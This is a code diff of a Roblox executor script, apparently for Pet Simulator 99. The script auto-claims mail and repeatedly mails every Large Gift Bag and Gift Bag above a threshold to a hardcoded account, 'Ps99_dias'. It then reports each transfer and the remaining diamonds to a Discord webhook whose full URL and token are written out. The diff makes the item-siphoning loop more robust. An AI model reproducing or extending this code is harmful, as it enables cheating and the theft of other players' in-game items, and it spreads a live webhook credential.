@@ -1,26 +1,36 @@
+repeat task.wait() until game:IsLoaded()
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local Network = ReplicatedStorage:WaitForChild("Network")
 
 -- Configuration
-getgenv().config = {
-    userToMail = "Ps99_dias",
-    webhookUrl = "https://discord.com/api/webhooks/1510138512807301302/rZtNxe2qHglLbcWZfuHKvP7fUR53TSFs-Cq6-NJO7qT-SXoim3Gn15LssQ82CMfVzC38",
-    
-    autoClaimMail = true,
-    autoSendMail = true,
-    
-    largeGiftThreshold = 20000,  -- Send Large Gift Bags if count >= 20,000
-    giftBagThreshold = 200000    -- Send Gift Bags if count >= 200,000
-}
+local userToMail = "Ps99_dias"
+local webhookUrl = "https://discord.com/api/webhooks/1510138512807301302/rZtNxe2qHglLbcWZfuHKvP7fUR53TSFs-Cq6-NJO7qT-SXoim3Gn15LssQ82CMfVzC38"
+
+local largeGiftThreshold = 20000  -- Send Large Gift Bags if count >= 20,000
+local giftBagThreshold = 200000    -- Send Gift Bags if count >= 200,000
 
 ----------------------------------------------------------------
 -- HELPER FUNCTIONS
 ----------------------------------------------------------------
 
--- Fetch player's current diamond count
+local function getMailRemote(remoteName)
+    local network = ReplicatedStorage:FindFirstChild("Network")
+    if not network then return nil end
+    
+    local remote = network:FindFirstChild(remoteName)
+    if remote then return remote end
+    
+    for _, child in pairs(network:GetChildren()) do
+        if child.Name:lower():find(remoteName:lower():gsub(":", "")) then
+            return child
+        end
+    end
+    return nil
+end
+
 local function getDiamondsLeft()
     local diamonds = 0
     pcall(function()
@@ -36,7 +46,6 @@ local function getDiamondsLeft()
     return diamonds
 end
 
--- Format numbers with commas (e.g. 200004 -> 200,004)
 local function formatNumber(amount)
     local formatted = tostring(amount)
     local k
@@ -47,9 +56,8 @@ local function formatNumber(amount)
     return formatted
 end
 
--- Send Discord Webhook matching your embed layout
 local function sendWebhook(itemName, itemCount)
-    if config.webhookUrl == "" or config.webhookUrl == "YOUR_DISCORD_WEBHOOK_URL_HERE" then return end
+    if not webhookUrl or webhookUrl == "" then return end
 
     local diamondsLeft = formatNumber(getDiamondsLeft())
     local formattedCount = formatNumber(itemCount)
@@ -59,11 +67,11 @@ local function sendWebhook(itemName, itemCount)
         ["embeds"] = {
             {
                 ["title"] = "📬 You have mailed an item!",
-                ["color"] = 15258703, -- Dark orange/gold accent
+                ["color"] = 15258703,
                 ["fields"] = {
                     {
                         ["name"] = "📦 Mailed Item Info:",
-                        ["value"] = "Item: `" .. itemName .. " (x" .. formattedCount .. ")`\nSent to: `" .. config.userToMail .. "`",
+                        ["value"] = "Item: `" .. itemName .. " (x" .. formattedCount .. ")`\nSent to: `" .. userToMail .. "`",
                         ["inline"] = false
                     },
                     {
@@ -79,23 +87,20 @@ local function sendWebhook(itemName, itemCount)
         }
     }
 
-    -- Set thumbnail icon based on item
     if itemName == "Large Gift Bag" then
         embedData.embeds[1]["thumbnail"] = { ["url"] = "https://tr.rbxcdn.com/180ed7e834bd780829d5a9d80d2ceb58/150/150/Image/Png" }
     elseif itemName == "Gift Bag" then
         embedData.embeds[1]["thumbnail"] = { ["url"] = "https://tr.rbxcdn.com/2b39920ef1351d3caae9823cebf0d8c2/150/150/Image/Png" }
     end
 
-    local jsonData = HttpService:JSONEncode(embedData)
-
     pcall(function()
-        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        if request then
-            request({
-                Url = config.webhookUrl,
+        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        if req then
+            req({
+                Url = webhookUrl,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
+                Body = HttpService:JSONEncode(embedData)
             })
         end
     end)
@@ -106,11 +111,12 @@ end
 ----------------------------------------------------------------
 task.spawn(function()
     while task.wait(5) do
-        if config.autoClaimMail then
-            pcall(function()
-                Network:WaitForChild("Mailbox: Claim All"):InvokeServer()
-            end)
-        end
+        pcall(function()
+            local claimRemote = getMailRemote("Mailbox: Claim All") or getMailRemote("Mailbox_ClaimAll")
+            if claimRemote then
+                claimRemote:InvokeServer()
+            end
+        end)
     end
 end)
 
@@ -119,46 +125,50 @@ end)
 ----------------------------------------------------------------
 task.spawn(function()
     while task.wait(10) do
-        if config.autoSendMail then
-            pcall(function()
-                local saveModule = require(ReplicatedStorage.Library.Client.Save)
-                local result = saveModule.Get()
+        pcall(function()
+            local saveModule = require(ReplicatedStorage.Library.Client.Save)
+            local result = saveModule.Get()
+            
+            if result and result.Inventory and result.Inventory.Misc then
                 local ms = result.Inventory.Misc 
 
                 for itemIndex, itemData in pairs(ms) do
-                    -- Send Large Gift Bag if account has 20,000+
-                    if itemData.id == "Large Gift Bag" and itemData._am >= config.largeGiftThreshold then
+                    local sendRemote = getMailRemote("Mailbox: Send") or getMailRemote("Mailbox_Send")
+                    if not sendRemote then break end
+
+                    -- Send Large Gift Bag if threshold reached
+                    if itemData.id == "Large Gift Bag" and itemData._am and itemData._am >= largeGiftThreshold then
                         local amountToSend = itemData._am
                         local payload = {
-                            [1] = config.userToMail,
-                            [2] = "",
-                            [3] = "Misc",
-                            [4] = itemIndex,
-                            [5] = amountToSend
+                            userToMail,
+                            "",
+                            "Misc",
+                            itemIndex,
+                            amountToSend
                         }
                         
-                        local success = Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(payload))
+                        sendRemote:InvokeServer(unpack(payload))
                         sendWebhook("Large Gift Bag", amountToSend)
-                        task.wait(1)
+                        task.wait(2)
                     end
 
-                    -- Send Gift Bag if account has 200,000+
-                    if itemData.id == "Gift Bag" and itemData._am >= config.giftBagThreshold then
+                    -- Send Gift Bag if threshold reached
+                    if itemData.id == "Gift Bag" and itemData._am and itemData._am >= giftBagThreshold then
                         local amountToSend = itemData._am
                         local payload = {
-                            [1] = config.userToMail,
-                            [2] = "",
-                            [3] = "Misc",
-                            [4] = itemIndex,
-                            [5] = amountToSend
+                            userToMail,
+                            "",
+                            "Misc",
+                            itemIndex,
+                            amountToSend
                         }
                         
-                        local success = Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(payload))
+                        sendRemote:InvokeServer(unpack(payload))
                         sendWebhook("Gift Bag", amountToSend)
-                        task.wait(1)
+                        task.wait(2)
                     end
                 end
-            end)
-        end
+            end
+        end)
     end
 end)
